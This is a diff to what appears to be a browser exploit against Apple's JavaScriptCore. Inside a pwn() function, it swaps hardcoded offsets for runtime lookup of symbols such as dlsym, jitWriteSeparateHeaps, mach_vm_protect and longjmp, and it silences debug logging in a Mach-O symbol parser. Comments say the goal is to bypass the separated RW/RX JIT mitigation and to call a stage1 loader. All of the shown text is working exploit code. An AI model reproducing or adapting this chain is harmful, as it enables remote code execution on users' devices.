@@ -195,7 +195,7 @@ function find_symbol_address(macho_base, name) {
         var lc_cmdsize = read32(Add(lc, 4)); //offsetof(load_command, cmdsize)=4
         ptr = Add(ptr, lc_cmdsize);
     }
-    log(`[*] symtab_cmd: ${symtab_cmd}`);
+    // log(`[*] symtab_cmd: ${symtab_cmd}`);
 
 
 
@@ -204,7 +204,7 @@ function find_symbol_address(macho_base, name) {
     for (var i = 0; i < ncmds; i++) {
         var sc = ptr;
         var sc_segname = readString(Add(sc, 8));
-        log(`[*] sc_segname: ${sc_segname}`);
+        // log(`[*] sc_segname: ${sc_segname}`);
         if(sc_segname === "___TEXT") {
 			text_segment = sc;
             break;
@@ -213,10 +213,10 @@ function find_symbol_address(macho_base, name) {
         var sc_cmdsize = read32(Add(sc, 4));
         ptr = Add(ptr, sc_cmdsize);
     }
-    log(`[*] text_segment: ${text_segment}`);
+    // log(`[*] text_segment: ${text_segment}`);
     var text_segment_vmaddr = read32(Add(text_segment, 0x18));
 	var slide = Sub(macho_base, text_segment_vmaddr);
-	log(`[*] slide: ${slide}`);
+	// log(`[*] slide: ${slide}`);
 
 
 
@@ -237,11 +237,11 @@ function find_symbol_address(macho_base, name) {
         var sc_cmdsize = read32(Add(sc, 4));
         ptr = Add(ptr, sc_cmdsize);
     }
-    log(`[*] linkedit_segment: ${linkedit_segment}`);
+    // log(`[*] linkedit_segment: ${linkedit_segment}`);
     var linkedit_segment_vmaddr = read32(Add(linkedit_segment, 0x18));
     var linkedit_segment_fileoff = read32(Add(linkedit_segment, 0x28));
 	var linkedit_base = Sub(Add(slide, linkedit_segment_vmaddr), linkedit_segment_fileoff);
-	log(`[*] linkedit_base: ${linkedit_base}`);
+	// log(`[*] linkedit_base: ${linkedit_base}`);
 
 
 
@@ -486,25 +486,49 @@ function pwn() {
     var libsystem_kernel_base = find_dylib_by_name(libcpp1_base, "libsystem_kernel")
     log(`[+] libsystem_kernel_base: ${libsystem_kernel_base}`);
 
+    var libsystem_c = find_dylib_by_name(libcpp1_base, "libsystem_c")
+    log(`[+] libsystem_c: ${libsystem_c}`);
+
+    //find symbols..
     var dlsym_addr = find_symbol_address(libdyld_base, "__dlsym");
     log(`[+] dlsym: ${dlsym_addr}`);
+
+    var jitWriteSeparateHeaps_addr = find_symbol_address(jsc_base, "___ZN3JSC29jitWriteSeparateHeapsFunctionE");
+    log(`[+] jitWriteSeparateHeaps: ${jitWriteSeparateHeaps_addr}`);
+
+    var longjmp_addr = find_symbol_address(libsystem_platform_base, "___longjmp");
+    log(`[+] longjmp: ${longjmp_addr}`);
+
+    var usleep_addr = find_symbol_address(libsystem_c, "__usleep");
+    log(`[+] usleep: ${usleep_addr}`);
+
+    var mach_vm_protect_addr = find_symbol_address(libsystem_kernel_base, "__mach_vm_protect");
+    log(`[+] mach_vm_protect: ${mach_vm_protect_addr}`);
+
+    var mach_task_self_addr = find_symbol_address(libsystem_kernel_base, "__mach_task_self_");
+    log(`[+] mach_task_self_: ${mach_task_self_addr}`);
+
+    //fail
+    // var __ZZ6dlopenE1p_addr = find_symbol_address(libdyld_base, "__ZZ6dlopenE1p");
+    // log(`[+] __ZZ6dlopenE1p: ${__ZZ6dlopenE1p_addr}`);
+
+    // return;
 
     // needed arguments to call stage1's _load
     var dlsym = Add(libdyld_base, dlsym_addr);
     
-
     // needed to bypass seperated RW, RX JIT mitigation
     var __MergedGlobals_52 = read64(Add(jsc_base, offsets.__MergedGlobals_52));
     var memPoolStart = read64(Add(__MergedGlobals_52, offsets.memPoolStart));    //__MergedGlobals_52 + 0xc8
     var memPoolEnd = read64(Add(__MergedGlobals_52, offsets.memPoolEnd));      //__MergedGlobals_52 + 0xd0
-    var jitWriteSeparateHeaps = read64(Add(jsc_base, offsets.jitWriteSeparateHeaps));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
+    var jitWriteSeparateHeaps = read64(Add(jsc_base, jitWriteSeparateHeaps_addr));  //__ZN3JSC29jitWriteSeparateHeapsFunctionE
     log(`[i] memPoolStart = ${memPoolStart}`);  
     log(`[i] memPoolEnd = ${memPoolEnd}`);
     log(`[i] jitWriteSeparateHeaps = ${jitWriteSeparateHeaps}`);
-    var longjmp = Add(libsystem_platform_base, offsets.longjmp);
-    var usleep = Add(webcore_base, offsets.usleep);
-    var mach_vm_protect = Add(libsystem_kernel_base, offsets.mach_vm_protect);
-    var mach_task_self_ = read64(Add(libsystem_kernel_base, offsets.mach_task_self_));
+    var longjmp = Add(libsystem_platform_base, longjmp_addr);
+    var usleep = Add(libsystem_c, usleep_addr);
+    var mach_vm_protect = Add(libsystem_kernel_base, mach_vm_protect_addr);
+    var mach_task_self_ = read64(Add(libsystem_kernel_base, mach_task_self_addr));
 
     // longjmp mitigation?; nullify when read *(uint64_t *)(_ReadStatusReg(TPIDRRO_EL0) + 0x38);
     var dyld_base;
